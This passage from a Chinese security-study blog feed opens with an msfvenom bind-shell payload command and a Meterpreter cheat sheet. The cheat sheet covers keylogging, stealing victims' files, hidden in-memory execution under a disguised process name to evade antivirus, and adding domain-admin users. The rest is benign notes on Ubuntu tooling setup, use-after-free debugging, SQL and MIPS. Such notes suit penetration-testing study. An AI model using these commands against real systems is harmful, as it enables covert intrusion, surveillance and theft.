title="4.bind_tcp"></a>4.bind_tcp</h3><p>基于TCP的正向连接shell，一般在内网使用，不需要设置LHOST。</p><p><code>msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell</code></p><p>加权运行。</p><h2 id="Meterpreter-常用命令"><a href="#Meterpreter-常用命令" class="headerlink" title="Meterpreter 常用命令"></a>Meterpreter 常用命令</h2><p>###1.基本命令</p><ul><li>help –查看Meterpreter帮助</li><li>background –返回，把meterpreter后台挂起</li><li>bgkill –杀死一个背景 meterpreter 脚本</li><li>bglist –提供所有正在运行的后台脚本的列表</li><li>bgrun –作为一个后台线程运行脚本</li><li>channel –显示活动频道</li><li>sessions -i number  –与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</li><li>sesssions -k  number  –与会话进行交互</li><li>close –关闭通道</li><li>exit –终止 meterpreter 会话</li><li>quit –终止 meterpreter 会话</li><li>interact id  –切换进一个信道</li><li>run –执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</li><li>irb –进入 Ruby 脚本模式</li><li>read –从通道读取数据</li><li>write –将数据写入到一个通道</li><li>run和bgrun –前台和后台执行以后它选定的 meterpreter 脚本</li><li>use –加载 meterpreter 的扩展</li><li>load/use –加载模块</li><li>Resource –执行一个已有的rc脚本</li></ul><h3 id="2-文件系统命令"><a href="#2-文件系统命令" class="headerlink" title="2.文件系统命令"></a>2.文件系统命令</h3><ul><li>cat c:\boot.ini –查看文件内容,文件必须存在</li><li>del c:\boot.ini –删除指定的文件</li><li>upload /root/Desktop/netcat.exe c:\  –上传文件到目标机主上，如upload  setup.exe C:\windows\system32\</li><li>download nimeia.txt /root/Desktop/   –下载文件到本机上如：download C:\boot.ini /root/或者download C:\“ProgramFiles”\Tencent\QQ\Users\295******125\Msg2.0.db /root/</li><li>edit c:\boot.ini   –编辑文件</li><li>getlwd –打印本地目录</li><li>getwd –打印工作目录</li><li>lcd –更改本地目录</li><li>ls –列出在当前目录中的文件列表</li><li>lpwd –打印本地目录</li><li>pwd –输出工作目录</li><li>cd c:\  –进入目录文件下</li><li>rm file  –删除文件</li><li>mkdir dier  –在受害者系统上的创建目录</li><li>rmdir –受害者系统上删除目录</li><li>dir –列出目标主机的文件和文件夹信息</li><li>mv –修改目标主机上的文件名</li><li>search -d d:\www -f web.config  –search 文件，如search  -d c:\  -f*.doc</li><li>meterpreter &gt; search -f autoexec.bat   –搜索文件</li><li>meterpreter &gt; search -f sea*.bat c:\xamp\</li><li>enumdesktops      –用户登录数</li><li>下载文件:使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件</li><li>上传文件: upload 命令为上传文件到我们的目标机器</li><li>查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。</li><li>切换、查询当前路径: pwd 命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径</li><li>sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞。</li><li>execute命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令<ul><li>如果希望隐藏后台执行，加参数-H <code>execute  -H -f notepad.exe</code></li><li>我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上 <code>execute  -H -i -f cmd.exe</code></li><li>在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀  <code>execute  -H -m -d notepad.exe-f  wce.exe -a "-o wce.txt" </code><ul><li>-d 在目标主机执行时显示的进程名称（用以伪装）</li><li>-m 直接从内存中执行</li><li>-o wce.txt 是wce.exe的运行参数</li></ul></li></ul></li><li>idletime命令:为显示目标机器截止到当前无操作命令的时间</li><li>search命令:在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用<code>search –h</code>命令来查看search命令的帮助信息</li><li>edit命令: 调用vi编辑器，对目标主机上的文件修改</li></ul><h3 id="3-网络命令"><a href="#3-网络命令" class="headerlink" title="3.网络命令"></a>3.网络命令</h3><ul><li><p>ipconfig/ifconfig –显示网络接口的关键信息，包括 IP 地址</p></li><li><p>portfwd  add -l 4444 -p 3389 -r 192.168.1.102  –端口转发,本机监听4444,把目标机3389转到本机4444</p></li><li><p>netstat -an | grep“4444”   –查看指定端口开放情况</p></li><li><p>rdesktop -u Administrator -p bk#123 127.0.0.1:4444  –使用rdesktop来连接桌面，-u 用户名 -p 密码</p></li><li><p>rdesktop 127.1.1.0:4444  –需要输入用户名和密码远程连接</p></li><li><p>route –查看或修改受害者路由表</p><ul><li>route add 192.168.1.0 255.255.255.0 1  –添加动态路由</li><li>route print  –路由表输出</li></ul></li><li><p>runget_local_subnets  –目标主机的内网IP段情况</p></li><li><p>Arp       –看ARP缓冲表</p></li><li><p>Getproxy     –获取代理</p></li><li><p>portfwd：网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。</p></li></ul><h3 id="4-键盘监听"><a href="#4-键盘监听" class="headerlink" title="4.键盘监听"></a>4.键盘监听</h3><ul><li>keyscan_start：开启键盘记录功能</li><li>keyscan_dump：显示捕捉到的键盘记录信息</li><li>keyscan_stop：停止键盘记录功能</li><li>uictl enable keyboard/mouse –接管目标主机的键盘和鼠标。</li></ul><h3 id="5-系统命令"><a href="#5-系统命令" class="headerlink" title="5.系统命令"></a>5.系统命令</h3><ul><li>reboot –重新启动受害人的计算机</li><li>reg –与受害人的注册表进行交互</li><li>rev2self  –回到控制目标主机的初始用户账户下</li><li>shell –获得控制台权限</li><li>shutdown –关闭了受害者的计算机</li><li>sysinfo  –查看目标机系统信息，如机器名，操作系统等</li><li>add_user username password -h ip     –在远程目标主机上添加一个用户</li><li>add_group_user “Domain Admins” username -h ip    –将用户添加到目标主机的域管理员组中</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>chrome</tag>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu16.04重装之各种环境搭建</title>
    <link href="/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>环境：ubuntu16.04</p><h1 id="0x00-vmtools解决坑点"><a href="#0x00-vmtools解决坑点" class="headerlink" title="0x00 vmtools解决坑点"></a>0x00 vmtools解决坑点</h1><p>有点无语，笔者踩坑无数，没想到有一天在重装vmtool的时候还能……</p><p>正常安装vmtool后仍旧无法与主机进行复制粘贴，关掉虚拟机查看虚拟机设置。</p><p><img src="https://i.loli.net/2020/10/10/zOQ1jZT5SYip47N.png" alt="捕获.PNG"></p><p><img src="https://i.loli.net/2020/10/10/9pYJxdtsKFEUy4M.png" alt="捕获.PNG"></p><p>建立的共享文件夹要设置属性为共享式。</p><p>搞完之后……就可以了。</p><p>此处贴一个跟我一样的暴躁博主教程：<br><a href="https://blog.csdn.net/zerolity/article/details/81206476">https://blog.csdn.net/zerolity/article/details/81206476</a></p><h1 id="0x01-pwntools安装"><a href="#0x01-pwntools安装" class="headerlink" title="0x01 pwntools安装"></a>0x01 pwntools安装</h1><p>1.安装python2.7和pip</p><p><code>sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential </code></p><p>2.升级pip：<code>sudo pip install --upgrade pip</code></p><p>更改pip的配置文件/usr/bin/pip</p><p>更改为：</p><p><img src="https://i.loli.net/2020/10/10/zGq57OjUeWcxXnM.png" alt="捕获.PNG"></p><p>3.安装pwntools：<code>sudo pip install pwntools</code></p><p>报错超时，换个阿里源就好了。</p><p>3.1 更换阿里源</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo su<br><span class="hljs-built_in">cd</span> /etc/apt <span class="hljs-comment">#切换到apt源文件</span><br><span class="hljs-built_in">mv</span> source.list sources.list_bak <span class="hljs-comment">#备份源文件</span><br>vim sources.list <span class="hljs-comment">#新建一个，直接把下面的内容copy进去</span><br></code></pre></td></tr></tbody></table></figure><p>copy的内容：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-comment"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span><br>deb-src http:<span class="hljs-regexp">//</span>archive.ubuntu.com/ubuntu xenial main restricted <span class="hljs-comment">#Added by software-properties</span><br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial main restricted<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial main restricted multiverse universe <span class="hljs-comment">#Added by software-properties</span><br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates main restricted<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates main restricted multiverse universe <span class="hljs-comment">#Added by software-properties</span><br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial multiverse<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates multiverse<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-backports main restricted universe multiverse<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-backports main restricted universe multiverse <span class="hljs-comment">#Added by software-properties</span><br>deb http:<span class="hljs-regexp">//</span>archive.canonical.com/ubuntu xenial partner<br>deb-src http:<span class="hljs-regexp">//</span>archive.canonical.com/ubuntu xenial partner<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security main restricted<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security main restricted multiverse universe <span class="hljs-comment">#Added by software-properties</span><br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security multiverse<br></code></pre></td></tr></tbody></table></figure><p>3.2 保存配置后，更新配置：<code>sudo apt-get update</code></p><p>之后再重新步骤三的安装命令即可。</p><p>4.测试</p><p><img src="https://i.loli.net/2020/10/10/7wzfu32HFRiCXap.png" alt="捕获.PNG"></p><p>无报错，返回了’1\xc0’，成功！</p><p>所以为啥第一次自己去安装pwntools的时候费了很多力气呢，感觉那时候踩坑无数到崩溃……</p><h1 id="0x02-GDB及三个插件的安装"><a href="#0x02-GDB及三个插件的安装" class="headerlink" title="0x02 GDB及三个插件的安装"></a>0x02 GDB及三个插件的安装</h1><p>在终端输入gdb，发现ubuntu16自带gdb，那我就直接安装插件得了。</p><ul><li>peda:做逆向破解</li><li>gef：用于debug最好</li><li>gdbinit：简单版</li></ul><p>用git下载插件：<br><code>git clone https://github.com/gatieme/GdbPlugins.git ~/GdbPlugins</code></p><p>没有git的下载：<code>apt-get install git</code></p><p>在目录GdbPlugin下可以看见三个插件，想用哪个插件就可以在该目录下输入对应命令：</p><pre><code class="hljs">echo "source ~/GdbPlugins/peda/peda.py" &gt; ~/.gdbinit echo "source ~/GdbPlugins/gef/gef.py" &gt; ~/.gdbinit echo "source ~/GdbPlugins/gdbinit/gdbinit" &gt; ~/.gdbinit  </code></pre><p>将切换脚本的指令写进bashrc,建立快捷指令来代替切换</p><pre><code class="hljs">vim ~/.bashrc</code></pre><p>进入之后找到alias开头的字符：</p><p><img src="https://s2.loli.net/2022/12/05/N59ICXurVaGdyqw.png" alt="image.png"></p><p>写入快捷指令：</p><pre><code class="hljs">alias peda='echo "source ~/GdbPlugins/peda/peda.py" &gt; ~/.gdbinit 'alias gef='echo "source ~/GdbPlugins/gef/gef.py" &gt; ~/.gdbinit 'alias gdbinit='echo "source ~/GdbPlugins/gdbinit/gdbinit" &gt; ~/.gdbinit  '</code></pre><p>保存并退出，更新bashrc文件：<br>    source ~/.bashrc</p><p><img src="https://s2.loli.net/2022/12/05/MZSyIkJnjqTo3c9.png" alt="image.png"></p><p>成功切换</p><h1 id="0x03-安装checksec"><a href="#0x03-安装checksec" class="headerlink" title="0x03 安装checksec"></a>0x03 安装checksec</h1><pre><code class="hljs">git clone https://github.com/slimm609/checksec.sh.gitcd checksec.sh</code></pre><p>目录下的checksec本来想建立一个软链接过去/usr/local/bin里，但是一直打不开，于是直接用cp命令把checksec拷贝过去了。在/usr/local/bin能够打开checksec，才算成功。</p><p>(again次装：在cd checksec.sh之后就能用了，不用建软链接，我真的很异或)</p><h1 id="0x04-安装docker-pikachu靶场"><a href="#0x04-安装docker-pikachu靶场" class="headerlink" title="0x04 安装docker+pikachu靶场"></a>0x04 安装docker+pikachu靶场</h1><h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h4><ul><li>先卸载可能存在的旧版本： <code>$ sudo apt-get remove docker docker-engine docker-ce docker.io</code></li><li>更新apt包索引: <code>$ sudo apt-get update</code></li><li>安装以下包以使apt可以通过HTTPS使用存储库（repository）: <code>$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</code></li><li>添加Docker官方的GPG密钥： <code>$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></li><li>使用下面的命令来设置stable存储库： <code>$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</code></li><li>再更新一下apt包索引: <code>$ sudo apt-get update</code></li><li>安装最新版本的Docker CE：<code>$ sudo apt-get install -y docker-ce</code></li><li>查看docker服务是否启动： <code>$ systemctl status docker</code></li><li>若未启动，则启动docker服务: <code>$ sudo systemctl start docker</code></li><li>经典的hello world： <code>$ sudo docker run hello-world</code></li></ul><p><img src="https://i.loli.net/2020/10/13/kofhug8n2VNj1bx.png" alt="捕获.PNG"></p><p>如图输出则表示docker安装成功。</p><h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h4>]]></content>
    
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAF漏洞简单学习</title>
    <link href="/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>UAF漏洞是一种内存破坏漏洞，通常存在于浏览器中。</p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>uaf漏洞成因：一块堆内存被释放之后又被使用。<br>再一次被使用是指：指针存在（悬垂指针被引用）引用结果不可预测。</p><p>由于大多数堆内存都是C++对象，所以利用的核心思路即：分配堆去占坑，占的坑中又自己构造的虚表。</p><h2 id="分析方式"><a href="#分析方式" class="headerlink" title="分析方式"></a>分析方式</h2><p>分析uaf漏洞的要点在于弄清楚对象是在哪里被分配，被释放，被重用。</p><p>uaf异常触发点：对已释放的对象进行操作导致的异常，所以异常点即重用点。</p><p>而由于是对对象的操作，可以列出这个对象的所有方法，找出分配和释放的方法，对其下断来分析uaf过程。</p><blockquote><p>1.悬垂指针：指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针，比如一个对象的指针，如果这个对象已经被释放或者回收，但是指针没有进行任何的修改，仍然执行已被释放的内存，这个指针就叫做悬垂指针。</p><p>2.UAF漏洞：Use-AFTER-Free是一种内存破坏漏洞，简单来说，漏洞的原因是使用了悬垂指针。</p></blockquote><p>常见与UAF漏洞配合使用的是堆喷射，分配大量内存，增大靶子的面积，使eip跳进分配的内存中，而分配的内存中又充满了滑板指令，只要命中了滑板指令就可以命中shellcode</p><h2 id="调试方式"><a href="#调试方式" class="headerlink" title="调试方式"></a>调试方式</h2><p>对于uaf漏洞，调试器捕获到的异常并不是漏洞发生的第一现场，所以一般要使用gflags开启PageHeap和UST（windbg自带gflags工具）</p><p><code>gflags.exe /i 程序名.exe +hpa +ust</code></p><p>这样调试器会定位到最先出错的位置。</p><blockquote><p>技巧：<br>1.在ida中查找函数后，在windbg下断<br>2.打开poc文件后出现crash就是对象被重用，根据crash地址来找到重用的对象起始地址<br>3.对对象起始使用 <code>!heap -p -a 地址</code> 可获得这个对象的分配信息，由回溯还可以知道是什么函数分配的。<br>4.对分配函数下断到达分配现场<br>5.在回溯中，分配函数一般为RtlAllocateHeap的上层，而释放函数一般就是FreeHeap的上层。</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>chrome</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL学习与整理</title>
    <link href="/2022/08/09/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/"/>
    <url>/2022/08/09/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-SQL简介"><a href="#0x01-SQL简介" class="headerlink" title="0x01 SQL简介"></a>0x01 SQL简介</h2><p>SQL（结构化查询语言）用于访问和操作数据库中的数据的标准数据库编程语言。</p><p>SQL是关系数据库系统的标准语言，是一种ANSI标准的计算机语言。</p><p>要创建一个显示数据库中的数据的网站，需要：</p><ul><li>一个RDBMS数据库程序（MS Access SQL Server MySQL）</li><li>使用服务器端脚本语言（PHP ASP）</li><li>使用SQL来获取所需的数据</li><li>使用HTML/CSS来设置页面的样式</li></ul><h2 id="0x02-SQL-RDBMS概念"><a href="#0x02-SQL-RDBMS概念" class="headerlink" title="0x02 SQL RDBMS概念"></a>0x02 SQL RDBMS概念</h2><p>RDBMS是关系数据库管理系统的缩写，是SQL的基础。</p><h3 id="什么是表"><a href="#什么是表" class="headerlink" title="什么是表"></a>什么是表</h3><p>RDBMS中的数据存储在成为表的数据库对象中，这个表基本上是一个相关数据条目的集合，由许多列和行组成，表是关系数据库中最常见和最简单的数据存储形式。</p><h3 id="什么是字段"><a href="#什么是字段" class="headerlink" title="什么是字段"></a>什么是字段</h3><p>每个表都被分解成更小的实体，成为字段，Customers表中的字段由ID、姓名、年龄、地址和薪资组成。</p><p>字段是表中的列，用于维护有关表中每条记录的特定信息。</p><h3 id="什么是记录或者行数据"><a href="#什么是记录或者行数据" class="headerlink" title="什么是记录或者行数据"></a>什么是记录或者行数据</h3><p>记录也成为数据行，即表中存在的每个单独的条目。</p><p>记录是表中的水平实体。</p><h3 id="什么是列？"><a href="#什么是列？" class="headerlink" title="什么是列？"></a>什么是列？</h3><p>列是表彰的垂直实体，其中包含与表中特定字段关联的所有信息。</p><h3 id="什么是空值"><a href="#什么是空值" class="headerlink" title="什么是空值"></a>什么是空值</h3><p>表中的空值是显示为空的字段中的值，这意味中具有空值的字段是没有值的字段。</p><h3 id="SQL约束"><a href="#SQL约束" class="headerlink" title="SQL约束"></a>SQL约束</h3><p>约束是在表上的数据列上强制执行的规则，用于限制可以进入表中的数据类型，这确保了数据库中数据的准确性和可靠性。<br>约束可以是列级别，也可以是表级别，列级约束仅应用于一列，而表级约束则应用于整个表。</p><ul><li>NOT NULL约束：保列中数据不能有NULL值。</li><li>DEFAULT约束：提供该列数据未指定时所采用的默认值。</li><li>UNIQUE约束：保证列中的所有数据各不相同。</li><li>主键约束：唯一标识数据表中的行/记录</li><li>外键约束：唯一标识其他表中的一条行/记录</li><li>CHECK约束：此约束保证列中的所有值满足某一条件</li><li>索引：用于在数据库中快速创建或检索数据</li></ul><p>约束可以在创建表时规定（通过CREATE TABLE语句）或者在表创建减值后规定（通过ALTER TABLE语句）。</p><h3 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h3><p>每个关系数据库管理系统都存在以下类型的数据完整性：</p><ul><li>实体完整性-表中无重复行</li><li>域完整性-通过限制值的类型，格式或范围来强制执行给定列的有效条目</li><li>引用完整性-不能删除其他记录使用的行。</li><li>用户定义的完整性-强制执行一些不属于实体、域或引用完整性的特定业务规则。</li></ul><h3 id="数据库规范化"><a href="#数据库规范化" class="headerlink" title="数据库规范化"></a>数据库规范化</h3><p>数据库规范化是在数据库中有效的组织数据的过程，这个规范化过程有两个原因：</p><ul><li>消除多余数据</li><li>确保数据依赖关系是有意义的</li></ul><p>规范化指导原则称为范式，范式的目的是组织数据库结构，使其符合第一范式、第二范式和第三范式的规则。</p><h2 id="0x03-SQL语法"><a href="#0x03-SQL语法" class="headerlink" title="0x03 SQL语法"></a>0x03 SQL语法</h2><h3 id="SQL语法规则"><a href="#SQL语法规则" class="headerlink" title="SQL语法规则"></a>SQL语法规则</h3><ul><li>SQL语句总是以关键字开始，如SELECT、INSERT、UPDATE、DELETE、DROP、CREATE.</li><li>SQL语句以分号结尾</li><li>SQL不区分大小写。</li></ul><h3 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h3><p>数据库通常包含一个或多个表，每个表都用一个名称标识，该表包含带有数据的记录。</p><h3 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h3><p><code>SELECT * FROM Customers;</code></p><h3 id="一些重要的SQL命令"><a href="#一些重要的SQL命令" class="headerlink" title="一些重要的SQL命令"></a>一些重要的SQL命令</h3><ul><li><p>SELECT：从数据库中提取数据</p></li><li><p>UPDATE：更新数据库中的数据</p></li><li><p>DALETE：从数据库中删除数据</p></li><li><p>INSERT INTO：向数据库中插入新数据</p></li><li><p>CREATE DATABASE：创建新数据库</p></li><li><p>ALTER DATABASE:修改数据库</p></li><li><p>CREATE TABLE：创建数据库</p></li><li><p>ALTER TABLE:变更数据库表</p></li><li><p>DROP TABLE:删除表</p></li><li><p>CREATE INDEX：创建索引</p></li><li><p>DROP INDEX：删除索引</p></li><li><p>SELECT:<code>SELECT column_name(s) FROM table_name</code></p></li><li><p>SELECT语句和WHERE子句：<code>SELECT [*] FROM [TableName] WHERE [condition]</code></p></li><li><p>SELECT语句和WHERE和/或子句：<code>SELECT [*] FROM [TableName] WHERE [condition1] [AND [or]] [condition2]...</code></p></li><li><p>SELECT语句与ORDER BY:</p><ul><li><code>SELECT column_name()</code></li><li><code>FROM table_name</code></li><li><code>ORDER BY column_name() ASC or DESC</code></li></ul></li><li><p>SELECT DISTINCT（区分）子句：</p><ul><li><code>SELECT DISTINCT column1,...columnN</code></li><li><code>FROM table_name;</code></li></ul></li><li><p>SELECT IN子句：</p><ul><li><code>SELECT column1,column2...columnN</code></li><li><code>FROM table_name</code></li><li><code>WHERE column_name IN (val-1,val-2,...val-N);</code></li></ul></li><li><p>SELECT LIKE(类)子句：</p><ul><li><code>SELECT column1,column2...columnN</code></li><li><code>FROM table_name</code></li><li><code>WHERE column_name LIKE {PATTERN};</code></li></ul></li><li><p>SELECT COUNT（计数）子句：</p><ul><li><code>SELECT COUNT(column_name)</code></li><li><code>FROM table_name</code></li><li><code>WHERE CONDITION;</code></li></ul></li><li><p>SELECT与HAVING子句：</p><ul><li><code>SELECT SUM(column_name)</code></li><li><code>FROM table_name</code></li><li><code>WHERE CONDITION</code></li><li><code>GROUP BY column_name</code></li><li><code>HAVING (arithematic function condition);</code></li></ul></li><li><p>INSERT INTO语句：</p><ul><li><code>INSERT INTO table_name(column1,column2,column3,...)</code></li><li><code>VALUES (value,value1,value2,value3...)</code></li></ul></li><li><p>UPDATE语句：</p><ul><li><code>UPDATE table_name</code></li><li><code>SET column=value,column1=value1</code></li><li><code>WHERE someColumn=someValue</code></li></ul></li><li><p>DELETE语句：</p><ul><li><code>DELETE FROM tableName</code></li><li><code>WHERE someColumn=someValue</code></li></ul></li><li><p>CREATE语句：</p><ul><li><code>CREATE TABLE table_name(column1  datatype,column2 datatype,column3 datatype,...columnN datatype,PRIMARY KEY(one or moe columns ));</code></li></ul></li><li><p>DROP语句：</p><ul><li><code>DROP TABLE table_name;</code></li></ul></li><li><p>DROP INDEX语句：</p><ul><li><code>AL TER TABLE table_name</code></li><li><code>DROP INDEX index_name;</code></li></ul></li><li><p>DESC语句：</p><ul><li><code>DESC table_name;</code></li></ul></li><li><p>TRUNCATE截断表语句：</p><ul><li><code>TRUNCATE TABLE table_name;</code></li></ul></li><li><p>ALTER TABLE语句：</p><ul><li><code>ALTER TABLE table_name{ADD|DROP|MODIFY} column_name {data_type};</code></li></ul></li><li><p>ALTER TABLE(对表名重命名)</p><ul><li><code>ALTER TABLE table_name RENAME TO new_table_name;</code></li></ul></li><li><p>USE语句：</p><ul><li><code>USE database_name;</code></li></ul></li><li><p>COMMIT语句：</p><ul><li><code>COMMIT;</code></li></ul></li><li><p>ROLLBACK语句：</p><ul><li><code>ROLLBACK;</code></li></ul></li></ul><h2 id="0x04-SQL选择"><a href="#0x04-SQL选择" class="headerlink" title="0x04 SQL选择"></a>0x04 SQL选择</h2>]]></content>
    
    
    
    <tags>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIPS架构学习笔记</title>
    <link href="/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-寄存器"><a href="#0x01-寄存器" class="headerlink" title="0x01 寄存器"></a>0x01 寄存器</h1><h3 id="32个通用寄存器：-0-31-32位"><a href="#32个通用寄存器：-0-31-32位" class="headerlink" title="32个通用寄存器：$0-$31,32位"></a>32个通用寄存器：$0-$31,32位</h3><p>MIPS32中通用寄存器的约定用法：</p><p>|:–:|:–:|<br>|寄存器名字|约定名字|用途|<br>|$0|zero|总是为0|<br>|$1|at|留作汇编器生成一些合成指令|<br>|$2 $3|v0 v1|用来存放子程序返回值|<br>|$4<del>$7|a0</del>a3|调用子程序时，使用这4个寄存器传输前4个非浮点参数|<br>|$8<del>$15|t0</del>t7|临时寄存器，子程序使用时可以不用存储和恢复|<br>|$16<del>$23|s0</del>s7|子程序寄存器变量，改变这些寄存器值的子程序必须存储旧的值并在退出前恢复，对调用程序来说值不变|<br>|$24 $25|t8 t9|临时寄存器，子程序使用时可以不用存储和恢复|<br>|$26 $27|$k0 $k1|由异常处理程序使用|<br>|$28或$gp|gp|全局指针|<br>|$29或$sp|sp|堆栈指针|<br>|$30或$fp|s8/sp|子程序可以用来做堆栈帧指针|<br>|$31|ra|存放子程序返回地址|</p><h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><ul><li>PC:程序计数器</li><li>HI:乘除结果高位寄存器</li><li>LO:乘除结果低位寄存器</li></ul><p><b>MIPS架构属于小端模式</b></p><h3 id="MIPS指令"><a href="#MIPS指令" class="headerlink" 